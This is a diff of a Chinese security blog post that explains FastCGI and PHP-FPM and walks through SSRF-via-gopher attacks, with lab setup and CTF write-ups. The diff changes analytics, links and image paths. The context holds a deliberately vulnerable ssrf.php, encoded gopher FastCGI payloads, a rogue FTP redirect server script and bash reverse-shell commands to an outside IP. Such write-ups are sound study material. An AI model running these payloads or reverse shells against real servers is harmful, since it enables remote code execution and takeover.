@@ -14,10 +14,20 @@
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="format-detection" content="telephone=no">
+    <meta name="referrer" content="no-referrer-when-downgrade">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="referrer" content="no-referrer-when-downgrade">
     <!-- Global site tag (gtag.js) - Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BYTY196ENH"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'G-BYTY196ENH');
+    </script>
 
 
     <title>SSRF gopher打FastCGI | hybcx&#39;s blog</title>
@@ -263,7 +273,7 @@
         
         <li><div class="divider"></div></li>
         <li>
-            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+            <a href="https://github.com/hybchenxing/" class="waves-effect waves-light" target="_blank">
                 <i class="fab fa-github-square fa-fw"></i>Fork Me
             </a>
         </li>
@@ -320,7 +330,7 @@
     }
 </style>
 
-<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+<a href="https://github.com/hybchenxing/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
    data-tooltip="Fork Me" data-position="left" data-delay="50">
     <svg viewBox="0 0 250 250" aria-hidden="true">
         <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
@@ -419,11 +429,6 @@
                 
 
                 
-                    <div id="busuanzi_container_page_pv" class="info-break-policy">
-                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
-                        <span id="busuanzi_value_page_pv"></span>
-                    </div>
-				
             </div>
         </div>
         <hr class="clearfix">
@@ -449,10 +454,10 @@
 <p>众所周知，在网站分类中存在一种分类就是静态网站和动态网站，两者的区别就是静态网站只需要通过浏览器进行解析，其中的页面是一对一的(一个内容对应一个页面)，而动态网站需要一个额外的编译解析的过程，网页上的数据是从数据库中或者其他地方调用，页面会随着数据的变化而改变，就产生了一定的交互性。</p>
 <h2 id="浏览器访问静态网页过程">浏览器访问静态网页过程</h2>
 <p>在整个网页的访问过程中，Web容器(例如Apache、Nginx)只担任着内容分发者的身份，当访问静态网站的主页时，Web容器会到网站的相应目录中查找主页文件，然后发送给用户的浏览器。</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231222212119222.png" alt="image-20231222212119222"></p>
+<p><img src="image-20231222212119222.png" alt="image-20231222212119222"></p>
 <h2 id="浏览器访问动态网页过程">浏览器访问动态网页过程</h2>
 <p>当访问动态网站的主页时，根据容器的配置文件，它知道这个页面不是静态页面，web容器就会去找PHP解析器来进行处理(这里以Apache为例)，它会把这个请求进行简单的处理，然后交给PHP解释器。</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231222212144206.png" alt="image-20231222212144206"></p>
+<p><img src="image-20231222212144206.png" alt="image-20231222212144206"></p>
 <p>当Apache收到用户对 index.php 的请求后，如果使用的是CGI，会启动对应的 CGI 程序，对应在这里就是PHP的解析器。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程。</p>
 <p>这里说的是使用CGI，而FastCGI就相当于高性能的CGI，与CGI不同的是它像一个常驻的CGI，在启动后会一直运行着，不需要每次处理数据时都启动一次， 所以这里引出下面这句概念，FastCGI是语言无关的、可伸缩架构的CGI开放扩展，其主要行为是将CGI解释器进程保持在内存中，并因此获得较高的性能 。</p>
 <h2 id="FastCGI-Record">FastCGI Record</h2>
@@ -482,7 +487,7 @@
 <p><code>type</code>就是指定该record的作用。因为fastcgi一个record的大小是有限的，作用也是单一的，所以我们需要在一个TCP流里传输多个record。通过<code>type</code>来标志每个record的作用，用<code>requestId</code>作为同一次请求的id。</p>
 <p>也就是说，每次请求，会有多个record，他们的<code>requestId</code>是相同的。</p>
 <p>借用<a target="_blank" rel="noopener" href="http://blog.csdn.net/shreck66/article/details/50355729">该文章</a>中的一个表格，列出最主要的几种<code>type</code>：</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231222212837197.png" alt="image-20231222212837197"></p>
+<p><img src="image-20231222212837197.png" alt="image-20231222212837197"></p>
 <p>看了这个表格就很清楚了，服务器中间件和后端语言通信，第一个数据包就是<code>type</code>为1的record，后续互相交流，发送<code>type</code>为4、5、6、7的record，结束时发送<code>type</code>为2、3的record。</p>
 <p>当后端语言接收到一个<code>type</code>为4的record后，就会把这个record的body按照对应的结构解析成key-value对，这就是环境变量。</p>
 <h1>0x03 PHP-FPM</h1>
@@ -535,10 +540,10 @@
 <span class="token punctuation">;</span> <span class="token keyword">Default</span> Value<span class="token punctuation">:</span> <span class="token operator">.</span>php
 <span class="token punctuation">;</span>security<span class="token operator">.</span>limit_extensions <span class="token operator">=</span> <span class="token operator">.</span>php <span class="token operator">.</span>php3 <span class="token operator">.</span>php4 <span class="token operator">.</span>php5 <span class="token operator">.</span>php7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>其限定了只有某些后缀的文件允许被fpm执行，默认是<code>.php</code>。所以，当我们再传入<code>/etc/passwd</code>的时候，将会返回<code>Access denied.</code>：</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231222213611460.png" alt="image-20231222213611460"></p>
+<p><img src="image-20231222213611460.png" alt="image-20231222213611460"></p>
 <p>由于这个配置项的限制，如果想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。</p>
 <p>万幸的是，通常使用源安装php的时候，服务器上都会附带一些php后缀的文件，我们使用<code>find / -name "*.php"</code>来全局搜索一下默认环境：</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231222213704274.png" alt="image-20231222213704274"></p>
+<p><img src="image-20231222213704274.png" alt="image-20231222213704274"></p>
 <p>找到了不少。这就给我们提供了一条思路，假设我们爆破不出来目标环境的web目录，我们可以找找默认源安装后可能存在的php文件，比如<code>/usr/local/lib/php/PEAR.php</code>。</p>
 <h2 id="任意代码执行">任意代码执行</h2>
 <p>那在上述条件下我们即使<code>SCRIPT_FILENAME</code>可控，但由于其对于文件后缀的限制以及如果起服务器上没有相应的文件，则其会无法执行文件而返回404的特性，就不能执行我们想要其执行的恶意文件了，只能执行其服务器上存在的文件。</p>
@@ -588,11 +593,11 @@ auto_prepend_file   #在执行php文件前自动包含一个指定文件<span ar
 <pre class="line-numbers language-none"><code class="language-none">;listen = /run/php/php7.2-fpm.sock
 listen = 127.0.0.1:9000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>注意这里如果设置监听为0.0.0.0:9000就在产生php-fpm未授权访问漏洞，此时攻击者可以直接与9000端口上的php-fpm进行通信，进而可以实现任意代码执行。</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231222221408012.png" alt="image-20231222221408012"></p>
+<p><img src="image-20231222221408012.png" alt="image-20231222221408012"></p>
 <p>下面修改权限</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">777</span> /run/php/php7.2-fpm.sock<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>打开nginx的配置文件 <code>/etc/nginx/sites-available/default</code> 修改相应部分的配置</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223153845182.png" alt="image-20231223153845182"></p>
+<p><img src="image-20231223153845182.png" alt="image-20231223153845182"></p>
 <p>这里在位置1，修改一下nginx的根目录位置，最好别搞/var/www/html，这样似乎是与ubuntu自带的Apache2服务冲突（如果没有apache2当我没说），随后在位置2添加index.php，位置3中server_name 赋值为localhost。最后在其下面合适位置添加如下代码即可</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">location <span class="token operator">~</span>\<span class="token operator">.</span><span class="token class-name type-declaration">php</span>$ <span class="token punctuation">{</span>
                 <span class="token class-name type-declaration">try_files</span> <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token number">404</span><span class="token punctuation">;</span>
@@ -608,12 +613,12 @@ listen = 127.0.0.1:9000<span aria-hidden="true" class="line-numbers-rows"><span>
 <p>重新启动Nginx</p>
 <pre class="line-numbers language-none"><code class="language-none">sudo systemctl restart nginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>然后检查nginx是否正确启动 <code>systemctl status nginx</code></p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223154209189.png" alt="image-20231223154209189"></p>
+<p><img src="image-20231223154209189.png" alt="image-20231223154209189"></p>
 <p>检查php-fpm是否正确启动 <code>ps -elf | grep php-fpm</code></p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223154225259.png" alt="image-20231223154225259"></p>
+<p><img src="image-20231223154225259.png" alt="image-20231223154225259"></p>
 <p>这里就可以看出上面所说的存在一个master进程和多个worker进程</p>
 <p>下面将<code>/usr/share/nginx/html</code>目录下的文件删除，新建一个index.php，内容可以写上<code>&lt;?php phpinfo();?&gt;</code> 用来检查各项是否正常运行，如果页面为空，查看这篇<a target="_blank" rel="noopener" href="https://blog.csdn.net/feiniao8651/article/details/52768911">文章</a>解决</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223154307557.png" alt="image-20231223154307557"></p>
+<p><img src="image-20231223154307557.png" alt="image-20231223154307557"></p>
 <p>其中Sever API 处和上图一样说明运行正确，然后在目录下新建ssrf.php 内容为</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -631,7 +636,7 @@ listen = 127.0.0.1:9000<span aria-hidden="true" class="line-numbers-rows"><span>
     <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>该代码为一个ssrf漏洞的示例代码，可以访问<code>/ssrf.php?url=http://www.baidu.com</code>进行测试，下图为正常的结果</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223154416637.png" alt="image-20231223154416637"></p>
+<p><img src="image-20231223154416637.png" alt="image-20231223154416637"></p>
 <h2 id="ssrf攻击FastCGI演示">ssrf攻击FastCGI演示</h2>
 <h3 id="使用exp攻击">使用exp攻击</h3>
 <p>这里在已知其使用了php-fpm的情况下，我们可以先使用exp测试是否可以直接攻击9000端口，这个工具主要是用来攻击未授权访问php-fpm的，所以一些地方需要自己写脚本转换一下payload，下面是使用方法（网上有用go语言写的，这里我采用py的），这个代码似乎py2与py3均可执行，不过我这里直接用的py3，未测试py2</p>
@@ -858,12 +863,12 @@ PY2 <span class="token operator">=</span> <span class="token boolean">True</span
 <p>命令格式：<code>python [脚本名] -c [要执行的代码] -p [端口号] [ip] [要执行的php文件]</code></p>
 <p>即：<code>python3 ssrf+FastCGI.py -c "&lt;?php system('ls');?&gt;" -p 8888 192.168.246.130 /usr/share/nginx/html/index.php</code>  --这里实际是写web目录，但由于我配置的时候不是默认的/var/www/html，因此这里会不一样，当我们在实际遇到的话，一般都是后者。</p>
 <p>这里的由于我是用kali监听的端口，故此写了kali的ip与监听端口</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223160549388.png" alt="image-20231223160549388"></p>
+<p><img src="image-20231223160549388.png" alt="image-20231223160549388"></p>
 <p>接下来我们先运行上述exp，同时在kali开启监听，记录我们的攻击流量</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223160649189.png" alt="image-20231223160649189"></p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223160717260.png" alt="image-20231223160717260"></p>
+<p><img src="image-20231223160649189.png" alt="image-20231223160649189"></p>
+<p><img src="image-20231223160717260.png" alt="image-20231223160717260"></p>
 <p>这里的报错不用理会，如下图，这里成功将流量传到了1.txt，接下来将1.txt文件中的内容进行url编码（2次）因为我们这里是利用的ssrf进行的攻击</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223160728577.png" alt="image-20231223160728577"></p>
+<p><img src="image-20231223160728577.png" alt="image-20231223160728577"></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#-*- coding: UTF-8 -*-</span>
 <span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
 <span class="token builtin">file</span><span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span>
@@ -871,7 +876,7 @@ payload<span class="token operator">=</span> <span class="token builtin">file</s
 payload<span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"%0A"</span><span class="token punctuation">,</span><span class="token string">"%0A%0D"</span><span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"gopher://127.0.0.1:9000/_"</span><span class="token operator">+</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>将得到的结果传入到url参数中，如下图成功命令执行</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223161048500.png" alt="image-20231223161048500"></p>
+<p><img src="image-20231223161048500.png" alt="image-20231223161048500"></p>
 <p>这里看的文章也有一个值得注意的点，就是如果我们得知对方开启了php-fpm，我们可能会直接尝试exp去攻击，但往往会没有效果。这是因为就像我们刚刚的配置过程一般，我们设置的端口监听只允许127.0.0.1，因此如果我们直接进行攻击的话，我们的ip来源是公网的，因此不可能攻击成功。那如何才能可以攻击呢，有两种情况：</p>
 <ol>
 <li>对方在进行服务器配置的时候将php-fpm服务的9000端口暴露在了公网，那我们直接就可以进行攻击了。</li>
@@ -882,16 +887,16 @@ payload<span class="token operator">=</span> urllib<span class="token punctuatio
 <li>项目地址：<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></li>
 </ul>
 <p><a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">Gopherus</a> 这个工具相比上一个更加方便一下，该工具能生成Gopher有效负载，用来利用SSRF进行RCE：</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223162750134.png" alt="image-20231223162750134"></p>
+<p><img src="image-20231223162750134.png" alt="image-20231223162750134"></p>
 <p>我们浅浅看一下其exp，发现他最终对payload只进行了一次编码，因此我们如果在ssrf上进行攻击的时候，一般要进行2次编码。</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223162936883.png" alt="image-20231223162936883"></p>
+<p><img src="image-20231223162936883.png" alt="image-20231223162936883"></p>
 <p>下面我们就利用这个工具来执行命令：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python2 gopherus.py <span class="token parameter variable">--exploit</span> fastcgi
 /var/www/html/index.php                 <span class="token comment"># 这里输入的是一个已知存在的php文件</span>
 <span class="token function">id</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223163106812.png" alt="image-20231223163106812"></p>
+<p><img src="image-20231223163106812.png" alt="image-20231223163106812"></p>
 <p>我们将得到的结果在进行一次url编码，如下图成功执行</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223163343362.png" alt="image-20231223163343362"></p>
+<p><img src="image-20231223163343362.png" alt="image-20231223163343362"></p>
 <p>接下来还有很多攻击方法，我们继续学习！</p>
 <h2 id="FTP-SSRF-攻击-FPM-FastCGI">FTP+SSRF 攻击 FPM/FastCGI</h2>
 <p>这是在之前Laravel Debug mode RCE（CVE-2021-3129）漏洞的一个思路。该漏洞的核心就是传入 <code>file_get_contents() 和 file_put_contents() </code>这两个函数中的内容没有经过过滤，从而可以通过精巧的构造触发 phar 反序列化，达到RCE的效果。</p>
@@ -913,10 +918,10 @@ payload<span class="token operator">=</span> urllib<span class="token punctuatio
 <p>这里我还是有点难以理解，接下来我们直接实战来感受一下</p>
 <p>首先我们先来生成一下payload，这里采用的命令是bash来反弹shell</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">"bash -i &gt;&amp; /dev/tcp/124.220.233.26/9999 0&gt;&amp;1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223165548954.png" alt="image-20231223165548954"></p>
+<p><img src="image-20231223165548954.png" alt="image-20231223165548954"></p>
 <p>这里我们只需要截取_符号后面的内容</p>
 <pre class="line-numbers language-http" data-language="http"><code class="language-http">%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%0D%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH107%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%1FSCRIPT_FILENAME/usr/share/nginx/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00k%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.246.130/8888%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223165652350.png" alt="image-20231223165652350"></p>
+<p><img src="image-20231223165652350.png" alt="image-20231223165652350"></p>
 <p>设置好监听，然后编写如下脚本（脚本是从网上找的），在攻击机上搭建一个恶意的ftp服务，并将上面的payload中的数据替换掉下面ftp脚本中的payload的内容：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
 <span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquote
@@ -988,7 +993,7 @@ count <span class="token operator">=</span> <span class="token number">1</span>
     conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
     count <span class="token operator">+=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>运行上述脚本，一个恶意ftp服务就起来了：</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223171508219.png" alt="image-20231223171508219"></p>
+<p><img src="image-20231223171508219.png" alt="image-20231223171508219"></p>
 <p>这个脚本做的事情很简单，就是当客户端第一次连接的时候返回我们预设的 payload；当客户端第二次连接的时候将客户端的连接重定向到 127.0.0.1:9000，也就是目标主机上 php-fpm 服务的端口，从而造成 SSRF，攻击其 php-fpm。</p>
 <p>我认为上述多次连接的过程可以参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45843456/article/details/130508315?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170332214316800180630912%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=170332214316800180630912&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-130508315-null-null.142%5Ev96%5Epc_search_result_base9&amp;utm_term=ftp%E4%BC%9A%E8%BF%9E%E6%8E%A5%E5%87%A0%E6%AC%A1&amp;spm=1018.2226.3001.4187">FTP连接过程详解</a></p>
 <p>最后，构造如下请求，触发攻击：</p>
@@ -998,8 +1003,8 @@ count <span class="token operator">=</span> <span class="token number">1</span>
   <span class="token keyword">else</span><span class="token punctuation">:</span>
       conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"227 127,0,0,1,0,9000\n"</span><span class="token punctuation">)</span>  <span class="token comment"># 端口计算规则：35*256+40=9000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>上面代码第一个send发送的ip应该为我们搭建恶意ftp服务器所在的ip，而我当时一直用的127.0.0.1，很显然这是向他自己内部访问1234端口。。。。原来那位师傅搭建的环境都是在自己本机上。。。。犯这种错误真实很滑稽。。。</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223203844256.png" alt="image-20231223203844256"></p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223203853333.png" alt="image-20231223203853333"></p>
+<p><img src="image-20231223203844256.png" alt="image-20231223203844256"></p>
+<p><img src="image-20231223203853333.png" alt="image-20231223203853333"></p>
 <p>最后也是成功反弹shell(呜呜~~~~)</p>
 <p>假设有以下代码：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@@ -1035,8 +1040,8 @@ conn<span class="token punctuation">.</span>send<span class="token punctuation">
 conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'221 Goodbye.\n'</span><span class="token punctuation">)</span>
 conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>并在 vps 上开启一个 nc 监听，用于接收反弹的shell，最后构造 url 发送 payload 即可：</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223190024208.png" alt="image-20231223190024208"></p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223190033578.png" alt="image-20231223190033578"></p>
+<p><img src="image-20231223190024208.png" alt="image-20231223190024208"></p>
+<p><img src="image-20231223190033578.png" alt="image-20231223190033578"></p>
 <p>成功反弹shell</p>
 <h1>0x04 题目实战</h1>
 <h2 id="陇原战-疫-eaaasyphp">陇原战"疫"-eaaasyphp</h2>
@@ -1114,10 +1119,10 @@ conn<span class="token punctuation">.</span>close<span class="token punctuation"
 <p>这里浏览一遍会发现，敏感函数似乎是<code>file_put_contents($this-&gt;filename, $this-&gt;data);</code>这里的两个参数都可控，那么接下来就是分析链子了。</p>
 <p>不难分析出以下链子：<code>Bypass.__destruct()-&gt;Wecolme.__invoke()-&gt;Bunny.__toString()</code></p>
 <p>但这个Hint函数，需要绕过wakeup，首先看一下php版本信息，如下图为7.2.20，那这里修改属性值为其他整数是无法绕过的，看了几个wp发现修改为负数即可</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223205936482.png" alt="image-20231223205936482"></p>
+<p><img src="image-20231223205936482.png" alt="image-20231223205936482"></p>
 <p>并且这里事后诸葛亮一下，这里尝试写入文件会发现不成功，那我们就联想到了题目给的hint：phpinfo，那我们看看phpinfo其中有什么信息</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Hint"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token operator">-&gt;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Hint"</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223211450660.png" alt="image-20231223211450660"></p>
+<p><img src="image-20231223211450660.png" alt="image-20231223211450660"></p>
 <p>成功之后我们看到其中开启了FastCGI服务，那与我们刚刚学的对上了，而且恰好又有<code>file_put_contents($this-&gt;filename, $this-&gt;data);</code>的存在，这思路很明显了，接下来构造完整pop链子</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token keyword">class</span> <span class="token class-name-definition class-name">Check</span> <span class="token punctuation">{</span>
@@ -1159,10 +1164,10 @@ conn<span class="token punctuation">.</span>close<span class="token punctuation"
 <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$pop1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223213349348.png" alt="image-20231223213349348"></p>
+<p><img src="image-20231223213349348.png" alt="image-20231223213349348"></p>
 <p>这里可以确定其/var/www/html/index.php是存在的，直接利用gopherus打</p>
 <pre class="line-numbers language-none"><code class="language-none">bash -c "bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223215339556.png" alt="image-20231223215339556"></p>
+<p><img src="image-20231223215339556.png" alt="image-20231223215339556"></p>
 <p>取_后面的</p>
 <pre class="line-numbers language-http" data-language="http"><code class="language-http">%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/ip/8888%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>利用如下恶意文件在我们vps开启ftp服务</p>
@@ -1194,10 +1199,10 @@ conn<span class="token punctuation">.</span>send<span class="token punctuation">
 conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'221 Goodbye.\n'</span><span class="token punctuation">)</span>
 conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这里由于在我们真正想让其请求之前只传给过url，那只需要编码一次即可，最后在vps上开启ftp服务，还有监听端口（注意开放端口），接着向url传入如下：</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223215356085.png" alt="image-20231223215356085"></p>
+<p><img src="image-20231223215356085.png" alt="image-20231223215356085"></p>
 <p>注意这里的data我在url进行get传参了，如下图成功拿到flag</p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223215421794.png" alt="image-20231223215421794"></p>
-<p><img src="/2023/12/22/ssrf-da-fastcgi/image-20231223215416148.png" alt="image-20231223215416148"></p>
+<p><img src="image-20231223215421794.png" alt="image-20231223215421794"></p>
+<p><img src="image-20231223215416148.png" alt="image-20231223215416148"></p>
 <h2 id="蓝帽杯-2021-One-Pointer-PHP">蓝帽杯_2021_One_Pointer_PHP</h2>
 <p>发现这道题考点还是很多的，我几乎都没见过。。。。</p>
 <p>首先题目给了两个文件</p>
@@ -1229,13 +1234,13 @@ conn<span class="token punctuation">.</span>close<span class="token punctuation"
